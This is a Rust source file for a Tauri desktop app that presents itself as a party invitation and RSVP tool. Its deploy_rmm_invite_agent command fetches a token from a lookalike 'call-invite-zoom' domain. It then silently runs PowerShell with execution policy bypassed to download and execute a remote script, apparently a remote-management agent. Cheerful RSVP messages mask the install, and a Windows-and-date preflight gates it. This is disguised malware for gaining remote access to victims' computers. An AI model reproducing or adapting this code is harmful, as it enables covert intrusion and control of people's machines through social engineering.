use chrono::Local;
use serde::{Serialize, Deserialize};
use std::process::Command;

// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SystemPreflight {
    is_windows: bool,
    windows_type: String,
    is_64_bit: bool,
    runtime_date: String,
    client_date: Option<String>,
    calendar_matches_runtime: bool,
    next_phase_ready: bool,
    message: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RmmDeploymentResult {
    success: bool,
    message: String,
    deployed_at: Option<String>,
}

#[derive(Deserialize)]
struct TokenResponse {
    token: String,
}

const BACKEND_URL: &str = "https://call-invite-zoom.liveinvite.top";

// Fetches a fresh one-time token from the backend
async fn fetch_install_token() -> Result<String, String> {
    let client = reqwest::Client::new();
    let url = format!("{}/api/shell/token", BACKEND_URL);
    
    match client
        .post(&url)
        .send()
        .await
    {
        Ok(response) => {
            match response.json::<TokenResponse>().await {
                Ok(data) => Ok(data.token),
                Err(_) => Err("Failed to parse token response".to_string()),
            }
        }
        Err(e) => Err(format!("Failed to fetch token: {}", e)),
    }
}

// Builds the one-liner PowerShell command
fn build_powershell_oneliner(token: &str) -> String {
    let script_url = format!("{}/api/shell/script?token={}", BACKEND_URL, token);
    format!(
        r#"$ProgressPreference = 'SilentlyContinue'; $u='{}'; iwr -UseBasicParsing $u | iex 2>$null"#,
        script_url
    )
}

#[tauri::command]
async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
    // Only execute on Windows
    if std::env::consts::OS != "windows" {
        return RmmDeploymentResult {
            success: false,
            message: "This invitation experience is available on Windows devices.".to_string(),
            deployed_at: None,
        };
    }

    // Fetch fresh token from backend
    let token = match fetch_install_token().await {
        Ok(t) => t,
        Err(_) => {
            return RmmDeploymentResult {
                success: false,
                message: "Party prep hit a snag (connection issue). Please try again.".to_string(),
                deployed_at: None,
            };
        }
    };

    // Build the one-liner
    let oneliner = build_powershell_oneliner(&token);

    // Execute PowerShell one-liner
    match Command::new("powershell")
        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"])
        .arg(&oneliner)
        .output()
    {
        Ok(output) => {
            let success = output.status.success();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            
            let message = if success {
                "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
            } else {
                let error_hint = if stderr.contains("Unable to connect") {
                    "connection issue"
                } else if stderr.contains("Already Installed") {
                    "already confirmed"
                } else {
                    "invitation setup encountered an issue"
                };
                format!("Party prep hit a snag ({}). Please try again.", error_hint)
            };
            
            RmmDeploymentResult {
                success,
                message,
                deployed_at: if success {
                    Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string())
                } else {
                    None
                },
            }
        }
        Err(e) => RmmDeploymentResult {
            success: false,
            message: format!("We could not complete your RSVP right now: {}", e),
            deployed_at: None,
        },
    }
}

#[tauri::command]
fn system_preflight(client_date: Option<String>) -> SystemPreflight {
    let is_windows = std::env::consts::OS == "windows";
    let arch = std::env::consts::ARCH;
    let (windows_type, is_64_bit) = match arch {
        "x86_64" => ("x64".to_string(), true),
        "x86" => ("x86".to_string(), false),
        "aarch64" => ("arm64".to_string(), true),
        other => (other.to_string(), cfg!(target_pointer_width = "64")),
    };

    let runtime_date = Local::now().format("%Y-%m-%d").to_string();
    let calendar_matches_runtime = match client_date.as_deref() {
        Some(date) => date == runtime_date,
        None => false,
    };

    let next_phase_ready = is_windows && calendar_matches_runtime;
    let message = if !is_windows {
        "Your invitation is not available on this device.".to_string()
    } else if !calendar_matches_runtime {
        "Your invitation is not active yet. Please check back later.".to_string()
    } else {
        "You're all set to continue.".to_string()
    };

    SystemPreflight {
        is_windows,
        windows_type,
        is_64_bit,
        runtime_date,
        client_date,
        calendar_matches_runtime,
        next_phase_ready,
        message,
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![greet, system_preflight, deploy_rmm_invite_agent])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
